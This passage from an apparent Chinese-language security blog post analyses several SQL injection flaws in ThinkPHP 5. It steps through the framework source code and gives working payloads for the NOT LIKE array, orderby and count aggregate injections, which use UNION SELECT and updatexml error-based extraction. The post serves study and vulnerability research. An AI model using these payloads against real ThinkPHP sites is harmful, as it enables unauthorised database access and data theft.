        } elseif (in_array($exp, ['NOT BETWEEN', 'BETWEEN'])) {
            // BETWEEN 查询
            $data = is_array($value) ? $value : explode(',', $value);
            if (array_key_exists($field, $binds)) {
                if ($this->query->isBind($bindName . '_between_1')) {
                    $bindKey1 = $bindName . '_between_1' . uniqid();
                    $bindKey2 = $bindName . '_between_2' . uniqid();
                } else {
                    $bindKey1 = $bindName . '_between_1';
                    $bindKey2 = $bindName . '_between_2';
                }
                $bind = [
                    $bindKey1 => [$data[0], $bindType],
                    $bindKey2 => [$data[1], $bindType],
                ];
                $this->query->bind($bind);
                $between = ':' . $bindKey1 . ' AND :' . $bindKey2;
            } else {
                $between = $this->parseValue($data[0], $field) . ' AND ' . $this->parseValue($data[1], $field);
            }
            $whereStr .= $key . ' ' . $exp . ' ' . $between;
        } elseif (in_array($exp, ['NOT EXISTS', 'EXISTS'])) {
            // EXISTS 查询
            if ($value instanceof \Closure) {
                $whereStr .= $exp . ' ' . $this->parseClosure($value);
            } else {
                $whereStr .= $exp . ' (' . $value . ')';
            }
        } elseif (in_array($exp, [' TIME', '= TIME'])) {
            $whereStr .= $key . ' ' . substr($exp, 0, 2) . ' ' . $this->parseDateTime($value, $field, $options, $bindName, $bindType);
        } elseif (in_array($exp, ['BETWEEN TIME', 'NOT BETWEEN TIME'])) {
            if (is_string($value)) {
                $value = explode(',', $value);
            }
            $whereStr .= $key . ' ' . substr($exp, 0, -4) . $this->parseDateTime($value[0], $field, $options, $bindName . '_between_1', $bindType) . ' AND ' . $this->parseDateTime($value[1], $field, $options, $bindName . '_between_2', $bindType);
        }
        return $whereStr;
    }
在开头，会对传入的数据进行一个类型的判断，我们先来看一下传入字符串而不是数组的情况。
    if (!is_array($val)) {
        $val = ['=', $val];
    }
随后对操作符进行检测，传入字符串时默认为 `=`，在数组中，所以不进入if。
    if (!in_array($exp, $this->exp)) {
        $exp = strtolower($exp);
        if (isset($this->exp[$exp])) {
            $exp = $this->exp[$exp];
        } else {
            throw new Exception('where express error:' . $exp);
        }
    }
然后下面会进入这个判断，`$value` 的值就变为了 `:where_username`。
    if (is_scalar($value) && array_key_exists($field, $binds) && !in_array($exp, ['EXP', 'NOT NULL', 'NULL', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN']) && strpos($exp, 'TIME') === false) {
        if (strpos($value, ':') !== 0 || !$this->query->isBind(substr($value, 1))) {
            if ($this->query->isBind($bindName)) {
                $bindName .= '_' . str_replace('.', '_', uniqid('', true));
            }
            $this->query->bind($bindName, $value, $bindType);
            $value = ':' . $bindName;
        }
    }
下面就是操作符的不同而进入不同的分支了，这里的操作符是 `=` ，所以会进入下面这个判断中的else，最后`$whereStr` 的值就为
``username` = :where_username`。
    if (in_array($exp, ['=', '<>', '>', '>=', 'parseClosure($value);
        } else {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
        }
    }
往下SQL语句就成了 `"SELECT * FROM `user` WHERE `username` = :where_username
"`，到这已经不用往下看了，接下来就是预处理然后执行SQL语句了，无法进行注入。
那我们再来看看传入数组的情况，还是来到 `parseWhereItem()`。这里的 `username[0]=not like`
不管是大写还是小写都可以，都会被转化为大写。然后在根据操作符不同判断分支时会进入第二个分支。
    elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
        // 模糊匹配
        if (is_array($value)) {
            foreach ($value as $item) {
                $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
            }
            $logic = isset($val[2]) ? $val[2] : 'AND';
            $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
        } else {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
        }
    }
这里会对 `username[1]` 也就是 `$value` 进行一个类型的判断数组的话进入if，并对其进行一个拼接，`$logic` 被赋值为
`$username[2]` 的值，`$whereStr` 会等于`(`username` NOT LIKE '%' ) UNION SELECT
1,114514,DATABASE()# `username` NOT LIKE 'So4ms')`，返回之后直接拼接到了SQL语句中，就造成了注入。
而我们传入的参数的位置也就是这样的：`(`username` NOT LIKE '$username[1][0]' $username[2]
`username` NOT LIKE '$username[1][1]')`
这里本来使用 `LIKE` 也是同样的流程，但是使用 `request()->get()` 来获取参数的话会有下面这样一个过滤， `LIKE` 会过滤为
`LIKE` ，多了一个空格，就不满足上面的条件了，所以使用 `NOT LIKE`。
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
在小于5.0.10的版本中，只能使用大写的 `NOT LIKE` 而不能用小写，因为在 `parseWhereItem()`
中，有一个操作符的判断，如果不在给定的数组的值中，就会对键进行匹配，而在小于5.0.10的版本中，`NOT LIKE` 的 键为 `notlike`，即
`notlike:"NOT LIKE"`，所以 `not like` 不能成功执行，同时 `NOTLIKE` 在 `request()->get()`
中也被过滤了，所以只能使用 `NOT LIKE`，所以网上挺多这个漏洞只存在于5.0.10的说法是不对的。
    // 检测操作符
    if (!in_array($exp, $this->exp)) {
        $exp = strtolower($exp);
        if (isset($this->exp[$exp])) {
            $exp = $this->exp[$exp];
        } else {
            throw new Exception('where express error:' . $exp);
        }
    }
## 0x06 ThinkPHP v5 orderby 注入
###  0x00 影响范围
> ThinkPHP 5.1.16-5.1.22
###  0x01 演示版本
ThinkPHP v5.1.22  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
`?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1`
###  0x03 触发条件
添加一个路由进行查询。
    public function sql()
    {
        $orderby = request()->get('orderby');
        $result = db('user')->where(['username' => 'admin'])->order($orderby)->find();
        print_r($result);
    }
使用报错注入需开启debug。
###  0x04 调试分析
在 `order()` 方法处打下断点，看看正常情况下传入 `orderby=1` 的情况。
    public function order($field, $order = null)
    {
        if (empty($field)) {
            return $this;
        } elseif ($field instanceof Expression) {
            $this->options['order'][] = $field;
            return $this;
        }
        if (is_string($field)) {
            if (!empty($this->options['via'])) {
                $field = $this->options['via'] . '.' . $field;
            }
            if (strpos($field, ',')) {
                $field = array_map('trim', explode(',', $field));
            } else {
                $field = empty($order) ? $field : [$field => $order];
            }
        } elseif (!empty($this->options['via'])) {
            foreach ($field as $key => $val) {
                if (is_numeric($key)) {
                    $field[$key] = $this->options['via'] . '.' . $val;
                } else {
                    $field[$this->options['via'] . '.' . $key] = $val;
                    unset($field[$key]);
                }
            }
        }
        if (!isset($this->options['order'])) {
            $this->options['order'] = [];
        }
        if (is_array($field)) {
            $this->options['order'] = array_merge($this->options['order'], $field);
        } else {
            $this->options['order'][] = $field;
        }
        return $this;
    }
在第二个判断 `if (is_string($field))` 处显然是符合条件的，进入if，`$this->options['via']`
初始情况也是空的，来看下一个判断。
这里如果传入的参数带有逗号，就会以逗号为分隔符进行分割然后去掉首尾字符，否则由于这里 `$order` 默认为null，`$field` 等于自身。
    if (strpos($field, ',')) {
        $field = array_map('trim', explode(',', $field));
    } else {
        $field = empty($order) ? $field : [$field => $order];
    }
来到下面会判断是否为数组来进行不同的赋值。
    if (is_array($field)) {
        $this->options['order'] = array_merge($this->options['order'], $field);
    } else {
        $this->options['order'][] = $field;
    }
`order()` 结束了，跟进 `find()`，跟着调试一路跟进，在 `parseOrder()` 中，对输入的参数调用了 `parseKey()`
，如果是数字，那就返回数字本身，如果不是数字，那就接着往下，存在这样一个判断，满足条件会在两边加上反引号，这样的话如果我们直接进行注入，语句会被切割开分别加上反引号，显然我们是不能进行注入了。
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
如果我们传入一个数组，在 `order()` 中，直接对 `options['order']` 赋值。
    if (is_array($field)) {
        $this->options['order'] = array_merge($this->options['order'], $field);
    } else {
        $this->options['order'][] = $field;
    }
然后在 `parseOrder()` 中，由于传入的键值不是之前切割字符串时的数字，所以会进入else，`key` 值就是键值，然后在线进入
`parseKey()` 。
    if (is_numeric($key)) {
        list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' ');
    } else {
        $sort = $val;
    }
这里虽然也会被加上反引号，但是整个注入语句都在一对反引号，我们是可以将其闭合的，前一个反引号配上一个列名进行闭合，后一个反引号我们可以直接将其注释，就有：``id`|updatexml(1,concat(0x7,user(),0x7e),1)#`
`，而且这里 `' ORDER BY ' . implode(',', $array);` 是直接将其拼接到字符串中没有进行额外过滤的，就造成了注入。
## 0x07 ThinkPHP v5 聚合查询注入
###  0x00 影响范围
> ThinkPHP 5.0.0-5.0.21  
>  ThinkPHP 5.1.3-5.1.25
###  0x01 演示版本
ThinkPHP v5.1.22  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
`?count=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23`
###  0x03 触发条件
添加一个路由进行查询。
    public function sql()
    {
        $count = input('get.count');
        $result = db('user')->count($count);
        print_r($result);
    }
使用报错注入需开启debug。
###  0x04 调试分析
调用顺序 ：`count() => $this->aggregate() => $this->connection->aggregate()`。
此时看一下该方法的代码，`$aggregate` 是聚合方法，值为 `COUNT`，而 `$field` 是我们的输入，显然是要经过
`$this->builder->parseKey()` 进行处理，跟进看一下。
    public function aggregate(Query $query, $aggregate, $field)
    {
        $field = $aggregate . '(' . $this->builder->parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate);
        return $this->value($query, $field, 0);
    }
`$this->builder->parseKey()` 我们在上一个漏洞分析过了，在调用 `parseKey()` 时传入的参数 `$strict`
为true，所以我们的输入会被反引号包裹起来，然后返回结果，由于是整个字符串，且没有过滤，所以存在闭合的可能，返回的结果就为
`COUNT(`id`)+updatexml(1,concat(0x7,user(),0x7e),1) from user#`) AS tp_count`。
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
然后调用了 `$this->value()` ，接着就是熟悉的调用 `$this->builder->select()`
生成查询SQL，由于我们的关注内容通过 `$query->setOption('field', $field);` 保存在
`$options['field']` ，所以我们跟进 `$this->parseField()`，这里又有 `$this->parseKey`
对切割开为数组的内容进行处理。
    protected function parseField(Query $query, $fields)
    {
        if ('*' == $fields || empty($fields)) {
            $fieldsStr = '*';
        } elseif (is_array($fields)) {
            // 支持 'field1'=>'field2' 这样的字段别名定义
            $array = [];
            foreach ($fields as $key => $field) {
                if (!is_numeric($key)) {
                    $array[] = $this->parseKey($query, $key) . ' AS ' . $this->parseKey($query, $field, true);
                } else {
                    $array[] = $this->parseKey($query, $field);
                }
            }
            $fieldsStr = implode(',', $array);
        }
        return $fieldsStr;
    }
还是这个判断，但是这里 `$strict` 为false，且数组每一个值都包含括号，所以不会加上反引号，也就是不会发生变化。
    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
随后 `$fieldsStr = implode(',', $array);` 拼接起来，最后拼接到SQL语句中，为 `SELECT
COUNT(`id`)+updatexml(1,concat(0x7,user(),0x7e),1) from user#`) AS tp_count
FROM `user` LIMIT 1`，注入成功。
## 0x08 参考资料
[Thinkphp v5.1.41反序列化漏洞分析及EXP ](https://www.freebuf.com/vuls/269882.html
"Thinkphp v5.1.41反序列化漏洞分析及EXP ")  
[
ThinkPHP5代码审计【未开启强制路由导致RCE】](https://blog.csdn.net/weixin_45669205/article/details/116724655
" ThinkPHP5代码审计【未开启强制路由导致RCE】")  
[ThinkPHP 5.0命令执行漏洞分析及复现](https://www.freebuf.com/vuls/194127.html "ThinkPHP
5.0命令执行漏洞分析及复现")  
[ Thinkphp5.0.15 SQL注入](https://blog.csdn.net/rfrder/article/details/114376727
" Thinkphp5.0.15 SQL注入")  
[ ThinkPHP5.x注入漏洞学习 ](https://www.cnblogs.com/R0ser1/p/15093687.html "
ThinkPHP5.x注入漏洞学习 ")  
[ Thinkphp 5.1.17
SQL注入](https://blog.csdn.net/rfrder/article/details/114388453 " Thinkphp
5.1.17 SQL注入")  
[ Thinkphp 5.0.10
SQL注入](https://blog.csdn.net/rfrder/article/details/114408324 " Thinkphp
5.0.10 SQL注入")